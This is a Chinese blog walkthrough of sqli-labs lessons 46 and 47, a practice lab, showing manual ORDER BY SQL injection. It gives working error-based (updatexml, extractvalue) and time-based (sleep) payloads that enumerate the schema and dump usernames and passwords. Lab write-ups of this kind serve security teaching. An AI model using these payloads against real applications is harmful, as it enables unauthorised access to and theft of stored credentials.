# 原创
：  （手工）【sqli-labs46、47】order by 注入、报错回显、POST注入、数字/字符型

# （手工）【sqli-labs46、47】order by 注入、报错回显、POST注入、数字/字符型

**目录**

[一、推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[二、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[三、Less46（POST - Error based - Numeric - ORDER BY CLAUSE）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[3.1、简介：（order by注入-错误回显-POST注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[3.1、第一步：注入点测试](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 3.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[3.4、第三步：判断字段数/回显位](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[3.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[3.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[3.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[3.9、第八步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[四、Less47（POST - Error based - String - ORDER BY CLAUSE）](#%E5%9B%9B%E3%80%81Less43%EF%BC%88POST%20-%20Error%20based%20-%20String%20-%20Stacked%20with%20twist%EF%BC%89)

[4.1、简介：（order by注入-错误回显-POST注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[4.2、利用：](#5.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

---


> 
<h2>一、推荐：</h2>
[【SQL注入】order by 注入：联合盲注、报错、堆叠注入<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125815205?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125815205?spm=1001.2014.3001.5501)
[【SQL注入】堆叠注入https://blog.csdn.net/qq_53079406/article/details/125798787?spm=1001.2014.3001.5501<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125798787?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125798787?spm=1001.2014.3001.5501)[【SQL注入】数字型注入 &amp; 字符型注入https://blog.csdn.net/qq_53079406/article/details/125741101?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786402616781435435338%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786402616781435435338&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125741101-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%95%B0%E5%AD%97%E5%9E%8B&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125741101?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786402616781435435338%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786402616781435435338&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125741101-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%95%B0%E5%AD%97%E5%9E%8B&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125741101?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786402616781435435338%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786402616781435435338&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125741101-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%95%B0%E5%AD%97%E5%9E%8B&amp;spm=1018.2226.3001.4450)
[【SQL注入-无回显】布尔盲注：原理、函数、利用过程https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786796416782248562911%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786796416782248562911&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786796416782248562911%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786796416782248562911&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786796416782248562911%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786796416782248562911&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)[【SQL注入-无回显】时间盲注：原理、函数、利用过程https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786796416782248562911%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786796416782248562911&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786796416782248562911%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786796416782248562911&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165786796416782248562911%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165786796416782248562911&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)


---


---


## 二、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


## 三、Less46（POST - Error based - Numeric - ORDER BY CLAUSE）

> 
<h3>3.1、简介：（order by注入-错误回显-POST注入）</h3>
请求方法：POST
方法：order by注入+错误回显+数字型注入


> 
<h3>3.1、第一步：注入点测试</h3>
按照提示输入sort

<hr/>
输入'
报错，说明存在注入点

<hr/>
?sort=rand(true)<img alt="" height="810" src="https://img-blog.csdnimg.cn/bc33cd6bb2914f11a7bd68afd5fb4e46.png" width="1200"/>
 ?sort=rand(false)<img alt="" height="819" src="https://img-blog.csdnimg.cn/37cb5d6d8a6b411dab928725856b48a1.png" width="1200"/>
 存在注入点
且可以使用报错注入


---


> 
<h3> 3.3、第二步：分析过滤</h3>
方法一：
考虑一步一步将注入语句字符一个一个替换掉，直到不报错（浪费时间）
或者全部替换（如果报错，不知道哪里被过滤了）
<hr/>
方法二：
获取源码进行白盒审计（最优）


> 
<h3>3.4、第三步：判断字段数/回显位</h3>
?sort=3
回显正常

 ?sort=4
报错

 说明有3个字段


> 
<h3>3.5、第四步：暴库</h3>
?sort=(extractvalue(1,concat(0x7e,(select database()),0x7e)))#

 
或者
?sort=1 and updatexml(1,concat(0x7e,(database()),0x7e),1)

<hr/>
 或者（时间盲注）
?sort=1 and if(substr(database(),1,1)='s',sleep(5),0)


> 
<h3>3.6、第五步：爆表名</h3>
?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)

 
<hr/>
或者（时间盲注）

?sort=1 and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',sleep(5),0)


<br/>  

> 
<h3>3.7、第六步：爆字段</h3>
?sort=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)


 
<hr/>
或者（时间盲注）

?sort=1 and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',sleep(5),0)


> 
<h3>3.9、第八步：爆数据</h3>
?sort=1 and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)

<hr/>
或者（时间盲注）
?sort=1 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d',sleep(5),0)


---


---


## 四、Less47（POST - Error based - String - ORDER BY CLAUSE）

> 
<h3>4.1、简介：（order by注入-错误回显-POST注入）</h3>
请求方法：POST
方法：order by注入+错误回显+'闭合（字符型）


> 
<h3>4.2、利用：</h3>
与Less46相比
需要闭合'

